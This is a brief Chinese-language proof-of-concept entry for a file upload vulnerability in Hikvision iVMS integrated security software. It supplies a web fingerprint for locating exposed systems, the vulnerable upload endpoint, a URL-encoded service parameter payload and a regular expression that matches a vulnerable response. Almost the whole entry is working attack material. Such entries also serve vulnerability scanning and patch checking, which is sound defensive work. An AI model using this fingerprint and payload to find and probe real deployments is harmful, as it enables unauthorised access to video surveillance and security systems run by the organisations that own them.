# 海康iVMS综合安防存在文件上传漏洞

海康 ｜ 文件上传 ｜ —
- **指纹**：`web.body="/views/home/file/installPackage.rar"`
- **请求**：`POST /eps/api/resourceOperations/upload HTTP/1.1`

**Payload**
```
service=http%3A%2F%2Fip:port%3Ax%2Fhome%2Findex.action
```
- **响应特征**：200 ^(?=.*?token)(?=.*?empty).*?$